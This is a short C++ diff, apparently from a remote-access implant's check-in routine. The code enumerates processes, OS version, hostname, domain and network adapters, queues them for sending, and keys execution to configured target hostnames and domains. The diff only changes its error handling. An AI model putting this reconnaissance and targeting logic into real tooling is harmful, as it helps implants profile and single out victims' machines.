@@ -54,15 +54,14 @@ namespace Main {
 
 	    IP_ADAPTER_INFO adapter		= { };
 	    OSVERSIONINFOW os_version	= { };
-	    BOOL success = true;
+	    BOOL success = false;
 
 	    PROCESSENTRY32 proc_entry = { };
 	    proc_entry.dwSize = sizeof(PROCESSENTRY32);
 
 	    HANDLE snap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	    if (snap == INVALID_HANDLE_VALUE) {
-	    	// log error
-		    return false;
+		    goto defer;
 	    }
 
 	    x_ntassertb(ctx->enumapi.RtlGetVersion(&os_version));
@@ -98,7 +97,9 @@ namespace Main {
 	    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
 		    if (ctx->config.hostname[0]) {
 			    if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
-				    return false;
+                  // LOG ERROR (bad host)
+				    success = true;
+                    goto defer;
 			    }
 		    }
 		    PackString(out, buffer);
@@ -112,7 +113,9 @@ namespace Main {
 	    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
 		    if (ctx->network.domain[0]) {
 			    if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
-				    return false;
+                  // LOG ERROR (bad domain)
+                  success = true;
+                  goto defer;
 			    }
 		    }
 		    PackString(out, buffer);
@@ -138,9 +141,10 @@ namespace Main {
 	    }
 
 	    MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
+        success = true;
 
     defer:
-	    MessageQueue(out);
+        success ? MessageQueue(out) : DestroyStream(out);
 	    return success;
     }
 
